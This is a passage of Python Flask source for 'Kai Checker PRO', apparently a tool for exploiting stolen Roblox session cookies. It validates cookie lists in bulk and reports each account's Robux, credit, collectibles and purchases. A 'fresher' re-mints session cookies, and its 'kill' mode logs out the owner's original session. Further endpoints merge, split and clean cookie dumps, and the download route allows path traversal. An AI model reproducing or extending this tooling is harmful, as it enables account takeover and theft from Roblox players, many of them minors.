        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "mode": mode,
        "refreshed_count": refreshed_count,
        "usernames": usernames,
        "cookies": cookies
    })
    write_json_file(FRESHER_HISTORY_FILE, history)

# ==================== ОСНОВНАЯ ЛОГИКА ====================
def clean_cookie(cookie_str):
    cookie_str = cookie_str.strip()
    if "_|WARNING:-DO-NOT-SHARE-THIS." in cookie_str:
        match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"\s]+)', cookie_str)
        if match:
            return match.group(1)
    return cookie_str

def get_game_purchases(user_id, cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
    TARGET_GAMES = [
        'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
        'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
        'Tower Defense Simulator', 'Anime Adventures'
    ]
    purchases_by_game = {}
    total_spent = 0
    try:
        cursor = ""
        page = 0
        while page < 5:
            url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?limit=100&transactionType=Purchase"
            if cursor:
                url += f"&cursor={cursor}"
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code != 200:
                break
            data = r.json()
            for item in data.get('data', []):
                price = abs(item.get('currency', {}).get('amount', 0))
                if price < 10:
                    continue
                game_name = item.get('details', {}).get('place', {}).get('name', 'Другие игры')
                item_name = item.get('details', {}).get('name', 'Товар')
                matched = False
                for target in TARGET_GAMES:
                    if target.lower() in game_name.lower() or game_name.lower() in target.lower():
                        matched = True
                        break
                if not matched:
                    continue
                if game_name not in purchases_by_game:
                    purchases_by_game[game_name] = []
                purchases_by_game[game_name].append({'name': item_name, 'price': price})
                total_spent += price
            cursor = data.get('nextPageCursor')
            if not cursor:
                break
            page += 1
            time.sleep(0.1)
    except:
        pass
    return purchases_by_game, total_spent

def get_account_data(cookie):
    cookie = clean_cookie(cookie)
    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
    res_user = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
    if res_user.status_code != 200:
        return None
    user_data = res_user.json()
    user_id = user_data.get("id")
    username = user_data.get("name")
    display_name = user_data.get("displayName")
    robux = 0
    res_robux = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
    if res_robux.status_code == 200:
        robux = res_robux.json().get("robux", 0)
    is_premium = False
    created_date = "N/A"
    res_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers)
    if res_details.status_code == 200:
        dt = res_details.json()
        is_premium = dt.get("isPremium", False)
        created_str = dt.get("created", "")
        if created_str:
            created_date = created_str.split("T")[0]
    rap = 0
    res_rap = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers)
    if res_rap.status_code == 200:
        data = res_rap.json().get("data", [])
        rap = sum(item.get("recentAveragePrice", 0) for item in data)
    pending_robux = 0
    res_pend = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary", headers=headers)
    if res_pend.status_code == 200:
        pending_robux = res_pend.json().get("pendingRobuxTotal", 0)
    credit = "0.00"
    res_cred = requests.get("https://billing.roblox.com/v1/credit", headers=headers)
    if res_cred.status_code == 200:
        credit = f"{res_cred.json().get('balance', 0):.2f}"
    game_purchases, game_total_spent = get_game_purchases(user_id, cookie)
    return {
        "user_id": user_id, "username": username, "display_name": display_name,
        "robux": robux, "pending_robux": pending_robux, "credit": credit,
        "is_premium": is_premium, "created_date": created_date, "rap": rap,
        "cookie": cookie, "game_purchases": game_purchases, "game_total_spent": game_total_spent
    }

def format_single_report(info):
    if not info:
        return "❌ Невалидный кук или ошибка запроса"
    prem_str = "Да" if info["is_premium"] else "Нет"
    report = f"""========================================
👤 АККАУНТ: {info['username']} ({info['display_name']})
========================================
🆔 ID: {info['user_id']}
📅 Дата регистрации: {info['created_date']}
⭐ Premium: {prem_str}
💵 Robux: {info['robux']:,}
⏳ Pending Robux: {info['pending_robux']:,}
💳 Баланс / Credit: ${info['credit']}
💎 RAP (Коллекционка): {info['rap']:,}
========================================
📦 ГЕЙМПАССЫ (популярные игры):
"""
    if info['game_purchases']:
        sorted_games = sorted(info['game_purchases'].items(), key=lambda x: sum(p['price'] for p in x[1]), reverse=True)
        for game, passes in sorted_games:
            total = sum(p['price'] for p in passes)
            report += f"\n  🎮 {game} — {len(passes)} гп, ⏣ {total:,}"
            for p in passes[:3]:
                report += f"\n     └─ {p['name']} — ⏣ {p['price']:,}"
            if len(passes) > 3:
                report += f"\n     └─ ... и ещё {len(passes) - 3}"
        report += f"\n\n💰 Всего потрачено на геймпассы: ⏣ {info['game_total_spent']:,}"
    else:
        report += "\n  ❌ Геймпассов в популярных играх не найдено"
    report += f"""
========================================
🍪 Кук:
{info['cookie']}
========================================"""
    return report

# ==================== ФРЕШЕР ====================
def refresh_cookie_action(cookie, mode="duplicate"):
    cookie = clean_cookie(cookie)
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c:
            c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*'}
        check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=10)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"
            return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?')
        result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"
            return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Referer': 'https://www.roblox.com/', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"
            return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, timeout=15)
        new_cookie = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match:
                new_cookie = match.group(1)
        if not new_cookie:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value:
                    new_cookie = co.value
                    break
        if not new_cookie:
            result['error'] = "New cookie not found"
            return result
        if mode == "kill":
            try:
                kill_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=kill_headers, cookies=cookies_dict, timeout=10)
            except:
                pass
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie}, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie
            result['success'] = True
            result['username'] = test_r.json().get('name', result['username'])
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

def refresh_cookie_simple(cookie, mode="duplicate"):
    result = refresh_cookie_action(cookie, mode)
    if result['success']:
        return result['new_cookie']
    return None

# ==================== API ЭНДПОИНТЫ ====================
@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/single-check', methods=['POST'])
def single_check():
    data = request.json or {}
    cookie = data.get('cookie', '')
    info = get_account_data(cookie)
    if info:
        rep = format_single_report(info)
        save_checker_history_entry("single", 1, 1, [info['username']], [rep])
        return jsonify({"report": rep, "valid": True})
    return jsonify({"report": "❌ Невалидный кук", "valid": False})

@app.route('/api/mass-check-ws', methods=['POST'])
def mass_check_ws():
    file = request.files.get('file')
    if not file:
        return jsonify({"success": False, "message": "Файл не предоставлен"})
    content = file.read().decode('utf-8', errors='ignore')
    cookies = [line.strip() for line in content.splitlines() if line.strip()]
    if not cookies:
        return jsonify({"success": False, "message": "Файл пуст"})
    
    def run_process():
        total = len(cookies)
        valid_count = 0
        invalid_count = 0
        total_robux = 0
        premium_count = 0
        usernames = []
        full_reports = []
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            future_to_cookie = {executor.submit(get_account_data, c): c for c in cookies}
            completed = 0
            for future in as_completed(future_to_cookie):
                completed += 1
                info = future.result()
                rep = None
                if info:
                    valid_count += 1
                    total_robux += info["robux"]
                    if info["is_premium"]:
                        premium_count += 1
                    usernames.append(info["username"])
                    rep = format_single_report(info)
                    full_reports.append(rep)
                else:
                    invalid_count += 1
                    rep = "❌ Невалидный кук"
                
                socketio.emit('mass_progress', {
                    "current": completed,
                    "total": total,
                    "result": rep,
                    "full_report": rep if info else None
                })
        
        summary_header = f"""📊 ОТЧЁТ О ПРОВЕРКЕ
══════════════════════════════════════════════════════
📦 Всего куки: {total}
✅ Валидных: {valid_count} | ❌ Невалидных: {invalid_count}
💰 Всего Robux: {total_robux:,}
⭐ Premium: {premium_count}
══════════════════════════════════════════════════════

"""
        full_output = summary_header + "\n\n".join(full_reports)
        save_checker_history_entry("mass", valid_count, total, usernames, full_reports)
        
        socketio.emit('mass_complete', {
            "message": full_output,
            "valid_count": valid_count,
            "total_robux": total_robux,
            "premium_count": premium_count
        })

    eventlet.spawn(run_process)
    return jsonify({"success": True})

@app.route('/api/download-zip', methods=['POST'])
def download_zip():
    data = request.json or {}
    reports = data.get('reports', [])
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, rep in enumerate(reports, 1):
            match = re.search(r'👤 АККАУНТ:\s*([^\n\r]+)', rep)
            uname = match.group(1).split('(')[0].strip() if match else f"acc_{idx}"
            zf.writestr(f"{uname}.txt", rep)
    memory_file.seek(0)
    return send_file(memory_file, download_name="accounts_reports.zip", as_attachment=True)

@app.route('/api/fresher', methods=['POST'])
def run_fresher_api():
    data = request.json or {}
    cookies_raw = data.get('cookies', '')
    mode = data.get('mode', 'duplicate')
    cookies = [c.strip() for c in cookies_raw.splitlines() if c.strip()]
    if not cookies:
        return jsonify({"only_cookies": "Ошибка: Пустой ввод"})
    refreshed = []
    usernames = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(refresh_cookie_simple, c, mode) for c in cookies]
        for f in as_completed(futures):
            res = f.result()
            if res:
                refreshed.append(res)
                info = get_account_data(res)
                if info:
                    usernames.append(info['username'])
    save_fresher_history_entry(mode, len(refreshed), usernames, refreshed)
    return jsonify({"only_cookies": "\n".join(refreshed)})

# ==================== ИСТОРИЯ ====================
@app.route('/api/history/checker', methods=['GET'])
def get_checker_history():
    return jsonify({"history": read_json_file(CHECKER_HISTORY_FILE)})

@app.route('/api/history/fresher', methods=['GET'])
def get_fresher_history():
    return jsonify({"history": read_json_file(FRESHER_HISTORY_FILE)})

@app.route('/api/history/checker/clear', methods=['POST'])
def clear_checker_history():
    write_json_file(CHECKER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route('/api/history/fresher/clear', methods=['POST'])
def clear_fresher_history():
    write_json_file(FRESHER_HISTORY_FILE, [])
    return jsonify({"success": True})

# ==================== ИНСТРУМЕНТЫ ====================
@app.route('/api/merge-cookies', methods=['POST'])
def merge_cookies():
    files = request.files.getlist('files')
    merged = set()
    for f in files:
        lines = f.read().decode('utf-8', errors='ignore').splitlines()
        for l in lines:
            c = clean_cookie(l)
            if c:
                merged.add(c)
    content = "\n".join(merged)
    os.makedirs("downloads", exist_ok=True)
    out_path = os.path.join("downloads", "merged.txt")
    with open(out_path, "w", encoding="utf-8") as out:
        out.write(content)
    return jsonify({"success": True, "download_url": "/downloads/merged.txt"})

@app.route('/api/split-cookies', methods=['POST'])
def split_cookies():
    files = request.files.getlist('files')
    text = request.form.get('text', '')
    per_file = int(request.form.get('per_file', 1))
    cookies = []
    if files:
        for f in files:
            lines = f.read().decode('utf-8', errors='ignore').splitlines()
            for l in lines:
                c = clean_cookie(l)
                if c: cookies.append(c)
    if text:
        for l in text.splitlines():
            c = clean_cookie(l)
            if c: cookies.append(c)
    if not cookies:
        return jsonify({"success": False, "message": "Нет куков для разделения"})
    chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
    os.makedirs("downloads", exist_ok=True)
    zip_path = os.path.join("downloads", "split_cookies.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, chunk in enumerate(chunks, 1):
            zf.writestr(f"cookies_part_{idx}.txt", "\n".join(chunk))
    return jsonify({"success": True, "total_files": len(chunks), "download_url": "/downloads/split_cookies.zip"})

@app.route('/api/clean-cookies', methods=['POST'])
def clean_cookies():
    data = request.json or {}
    content = data.get('content', '')
    lines = content.splitlines()
    unique = set()
    for l in lines:
        c = clean_cookie(l)
        if c:
            unique.add(c)
    os.makedirs("downloads", exist_ok=True)
    out_path = os.path.join("downloads", "cleaned.txt")
    with open(out_path, "w", encoding="utf-8") as out:
        out.write("\n".join(unique))
    return jsonify({"success": True, "count": len(unique), "download_url": "/downloads/cleaned.txt"})

@app.route('/downloads/<filename>')
def download_file(filename):
    return send_file(os.path.join("downloads", filename), as_attachment=True)

if __name__ == '__main__':
    print("🚀 Kai Checker PRO запущен на http://localhost:5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
